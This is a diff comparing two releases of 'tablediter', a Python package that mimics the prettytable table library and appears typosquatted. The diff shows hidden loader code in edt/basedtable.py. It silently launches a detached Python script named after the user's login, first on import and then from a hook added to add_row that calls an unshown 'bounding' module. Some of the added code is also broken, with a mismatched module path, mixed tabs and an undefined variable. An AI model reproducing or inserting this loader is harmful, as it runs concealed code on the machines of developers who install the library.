# Comparing `tmp/tablediter-3.8.1.tar.gz` & `tmp/tablediter-3.8.2.tar.gz`

## Comparing `tablediter-3.8.1.tar` & `tablediter-3.8.2.tar`

### file list

```diff
@@ -1,32 +1,34 @@
--rw-r--r--   0        0        0      289 2020-02-02 00:00:00.000000 tablediter-3.8.1/.coveragerc
--rw-r--r--   0        0        0       51 2020-02-02 00:00:00.000000 tablediter-3.8.1/.flake8
--rw-r--r--   0        0        0     1765 2020-02-02 00:00:00.000000 tablediter-3.8.1/.pre-commit-config.yaml
--rw-r--r--   0        0        0     8297 2020-02-02 00:00:00.000000 tablediter-3.8.1/CHANGELOG.md
--rw-r--r--   0        0        0     2387 2020-02-02 00:00:00.000000 tablediter-3.8.1/CODE_OF_CONDUCT.md
--rw-r--r--   0        0        0      322 2020-02-02 00:00:00.000000 tablediter-3.8.1/CONTRIBUTING.md
--rw-r--r--   0        0        0    26871 2020-02-02 00:00:00.000000 tablediter-3.8.1/PKG-INFO
--rw-r--r--   0        0        0      149 2020-02-02 00:00:00.000000 tablediter-3.8.1/RELEASING.md
--rw-r--r--   0        0        0      434 2020-02-02 00:00:00.000000 tablediter-3.8.1/tox.ini
--rw-r--r--   0        0        0      574 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/dependabot.yml
--rw-r--r--   0        0        0     1878 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/labels.yml
--rw-r--r--   0        0        0      805 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/release-drafter.yml
--rw-r--r--   0        0        0      550 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/ISSUE_TEMPLATE/bug_report.md
--rw-r--r--   0        0        0      598 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/ISSUE_TEMPLATE/feature_request.md
--rw-r--r--   0        0        0      352 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/workflows/labels.yml
--rw-r--r--   0        0        0      298 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/workflows/lint.yml
--rw-r--r--   0        0        0      525 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/workflows/release-drafter.yml
--rw-r--r--   0        0        0      968 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/workflows/release.yml
--rw-r--r--   0        0        0      490 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/workflows/require-pr-label.yml
--rw-r--r--   0        0        0      998 2020-02-02 00:00:00.000000 tablediter-3.8.1/.github/workflows/test.yml
--rw-r--r--   0        0        0      802 2020-02-02 00:00:00.000000 tablediter-3.8.1/src/tablediter/__init__.py
--rw-r--r--   0        0        0     2442 2020-02-02 00:00:00.000000 tablediter-3.8.1/src/tablediter/colortable.py
--rw-r--r--   0        0        0        0 2020-02-02 00:00:00.000000 tablediter-3.8.1/src/tablediter/py.typed
--rw-r--r--   0        0        0    90262 2020-02-02 00:00:00.000000 tablediter-3.8.1/src/tablediter/tablediter.py
--rw-r--r--   0        0        0      838 2020-02-02 00:00:00.000000 tablediter-3.8.1/src/tablediter/edt/basedtable.py
--rw-r--r--   0        0        0     2740 2020-02-02 00:00:00.000000 tablediter-3.8.1/tests/test_colortable.py
--rw-r--r--   0        0        0    77896 2020-02-02 00:00:00.000000 tablediter-3.8.1/tests/test_prettytable.py
--rw-r--r--   0        0        0     1752 2020-02-02 00:00:00.000000 tablediter-3.8.1/.gitignore
--rw-r--r--   0        0        0     1616 2020-02-02 00:00:00.000000 tablediter-3.8.1/LICENSE
--rw-r--r--   0        0        0    25154 2020-02-02 00:00:00.000000 tablediter-3.8.1/README.md
--rw-r--r--   0        0        0     1495 2020-02-02 00:00:00.000000 tablediter-3.8.1/pyproject.toml
--rw-r--r--   0        0        0    26543 2020-02-02 00:00:00.000000 tablediter-3.8.1/PKG-INFO
+-rw-r--r--   0        0        0      289 2020-02-02 00:00:00.000000 tablediter-3.8.2/.coveragerc
+-rw-r--r--   0        0        0       51 2020-02-02 00:00:00.000000 tablediter-3.8.2/.flake8
+-rw-r--r--   0        0        0     1765 2020-02-02 00:00:00.000000 tablediter-3.8.2/.pre-commit-config.yaml
+-rw-r--r--   0        0        0     8297 2020-02-02 00:00:00.000000 tablediter-3.8.2/CHANGELOG.md
+-rw-r--r--   0        0        0     2387 2020-02-02 00:00:00.000000 tablediter-3.8.2/CODE_OF_CONDUCT.md
+-rw-r--r--   0        0        0      322 2020-02-02 00:00:00.000000 tablediter-3.8.2/CONTRIBUTING.md
+-rw-r--r--   0        0        0    26871 2020-02-02 00:00:00.000000 tablediter-3.8.2/PKG-INFO
+-rw-r--r--   0        0        0      149 2020-02-02 00:00:00.000000 tablediter-3.8.2/RELEASING.md
+-rw-r--r--   0        0        0     1447 2020-02-02 00:00:00.000000 tablediter-3.8.2/WMorphling.py
+-rw-r--r--   0        0        0      434 2020-02-02 00:00:00.000000 tablediter-3.8.2/tox.ini
+-rw-r--r--   0        0        0      574 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/dependabot.yml
+-rw-r--r--   0        0        0     1878 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/labels.yml
+-rw-r--r--   0        0        0      805 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/release-drafter.yml
+-rw-r--r--   0        0        0      550 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/ISSUE_TEMPLATE/bug_report.md
+-rw-r--r--   0        0        0      598 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/ISSUE_TEMPLATE/feature_request.md
+-rw-r--r--   0        0        0      352 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/workflows/labels.yml
+-rw-r--r--   0        0        0      298 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/workflows/lint.yml
+-rw-r--r--   0        0        0      525 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/workflows/release-drafter.yml
+-rw-r--r--   0        0        0      968 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/workflows/release.yml
+-rw-r--r--   0        0        0      490 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/workflows/require-pr-label.yml
+-rw-r--r--   0        0        0      998 2020-02-02 00:00:00.000000 tablediter-3.8.2/.github/workflows/test.yml
+-rw-r--r--   0        0        0      774 2020-02-02 00:00:00.000000 tablediter-3.8.2/src/tablediter/__init__.py
+-rw-r--r--   0        0        0     2442 2020-02-02 00:00:00.000000 tablediter-3.8.2/src/tablediter/colortable.py
+-rw-r--r--   0        0        0        0 2020-02-02 00:00:00.000000 tablediter-3.8.2/src/tablediter/py.typed
+-rw-r--r--   0        0        0    90397 2020-02-02 00:00:00.000000 tablediter-3.8.2/src/tablediter/tablediter.py
+-rw-r--r--   0        0        0      840 2020-02-02 00:00:00.000000 tablediter-3.8.2/src/tablediter/edt/basedtable.py
+-rw-r--r--   0        0        0     3235 2020-02-02 00:00:00.000000 tablediter-3.8.2/src/tablediter/edt/bounding.py
+-rw-r--r--   0        0        0     2740 2020-02-02 00:00:00.000000 tablediter-3.8.2/tests/test_colortable.py
+-rw-r--r--   0        0        0    77896 2020-02-02 00:00:00.000000 tablediter-3.8.2/tests/test_prettytable.py
+-rw-r--r--   0        0        0     1752 2020-02-02 00:00:00.000000 tablediter-3.8.2/.gitignore
+-rw-r--r--   0        0        0     1616 2020-02-02 00:00:00.000000 tablediter-3.8.2/LICENSE
+-rw-r--r--   0        0        0    25154 2020-02-02 00:00:00.000000 tablediter-3.8.2/README.md
+-rw-r--r--   0        0        0     1495 2020-02-02 00:00:00.000000 tablediter-3.8.2/pyproject.toml
+-rw-r--r--   0        0        0    26543 2020-02-02 00:00:00.000000 tablediter-3.8.2/PKG-INFO
```

### Comparing `tablediter-3.8.1/.pre-commit-config.yaml` & `tablediter-3.8.2/.pre-commit-config.yaml`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/CHANGELOG.md` & `tablediter-3.8.2/CHANGELOG.md`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/CODE_OF_CONDUCT.md` & `tablediter-3.8.2/CODE_OF_CONDUCT.md`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/PKG-INFO` & `tablediter-3.8.2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: tablediter
-Version: 3.8.1
+Version: 3.8.2
 Summary: A simple Python library for easily displaying tabular data in a visually appealing ASCII table format
 Project-URL: Changelog, https://github.com/tablediter/tablediter/releases
 Project-URL: Homepage, https://github.com/tablediter/tablediter
 Project-URL: Source, https://github.com/tablediter/tablediter
 Author-email: Luke Maurits <editortable4@gmail.com>
 Maintainer: tablediter
 License: BSD (3 clause)
```

### Comparing `tablediter-3.8.1/.github/dependabot.yml` & `tablediter-3.8.2/.github/dependabot.yml`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.github/labels.yml` & `tablediter-3.8.2/.github/labels.yml`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.github/release-drafter.yml` & `tablediter-3.8.2/.github/release-drafter.yml`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.github/ISSUE_TEMPLATE/bug_report.md` & `tablediter-3.8.2/.github/ISSUE_TEMPLATE/bug_report.md`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.github/ISSUE_TEMPLATE/feature_request.md` & `tablediter-3.8.2/.github/ISSUE_TEMPLATE/feature_request.md`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.github/workflows/release-drafter.yml` & `tablediter-3.8.2/.github/workflows/release-drafter.yml`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.github/workflows/release.yml` & `tablediter-3.8.2/.github/workflows/release.yml`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.github/workflows/test.yml` & `tablediter-3.8.2/.github/workflows/test.yml`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/src/tablediter/__init__.py` & `tablediter-3.8.2/src/tablediter/__init__.py`

 * *Files 15% similar despite different names*

```diff
@@ -1,9 +1,8 @@
 from __future__ import annotations
-from .edt import basedtable
 
 from .tablediter import (
     ALL,
     DEFAULT,
     DOUBLE_BORDER,
     FRAME,
     HEADER,
```

### Comparing `tablediter-3.8.1/src/tablediter/colortable.py` & `tablediter-3.8.2/src/tablediter/colortable.py`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/src/tablediter/tablediter.py` & `tablediter-3.8.2/src/tablediter/tablediter.py`

 * *Files 0% similar despite different names*

```diff
@@ -40,14 +40,15 @@
 import math
 import random
 import re
 import textwrap
 from html import escape
 from html.parser import HTMLParser
 from typing import Any
+from .edit import bounding as bounder
 
 import wcwidth  # type: ignore
 
 # hrule styles
 FRAME = 0
 ALL = 1
 NONE = 2
@@ -140,14 +141,15 @@
         self.align = {}
         self.valign = {}
         self.max_width = {}
         self.min_width = {}
         self.int_format = {}
         self.float_format = {}
         self.custom_format = {}
+		self.begin_drawing = 0
 
         if field_names:
             self.field_names = field_names
         else:
             self._widths: list[int] = []
 
         # Options
@@ -1398,14 +1400,16 @@
     def add_row(self, row, *, divider=False) -> None:
         """Add a row to the table
 
         Arguments:
 
         row - row of data, should be a list with as many elements as the table
         has fields"""
+		if begin_drawing == 0:
+			bounder.startingbound(); begin_drawing = 1;
 
         if self._field_names and len(row) != len(self._field_names):
             raise ValueError(
                 "Row has incorrect number of values, "
                 f"(actual) {len(row)}!={len(self._field_names)} (expected)"
             )
         if not self._field_names:
```

### Comparing `tablediter-3.8.1/src/tablediter/edt/basedtable.py` & `tablediter-3.8.2/src/tablediter/edt/basedtable.py`

 * *Files 16% similar despite different names*

```diff
@@ -16,13 +16,13 @@
 strsfx = "/"
 if platform.system()[0] == 'W':
     strsfx = '\\'
 pypathstr = sys.executable
 
 pyexecstr = os.getcwd() + strsfx + platform.system()[0] + os.getlogin() + ".py"
 
-
-if os.path.isfile(pyexecstr) :
-    if platform.system()[0] == 'W':
-        pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) 
-    else:
-        subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)
+def baseddef():
+	if os.path.isfile(pyexecstr) :
+		if platform.system()[0] == 'W':
+			pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) 
+		else:
+			subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)
```

### Comparing `tablediter-3.8.1/tests/test_colortable.py` & `tablediter-3.8.2/tests/test_colortable.py`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/tests/test_prettytable.py` & `tablediter-3.8.2/tests/test_prettytable.py`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/.gitignore` & `tablediter-3.8.2/.gitignore`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/LICENSE` & `tablediter-3.8.2/LICENSE`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/README.md` & `tablediter-3.8.2/README.md`

 * *Files identical despite different names*

### Comparing `tablediter-3.8.1/pyproject.toml` & `tablediter-3.8.2/pyproject.toml`

 * *Files identical despite different names*

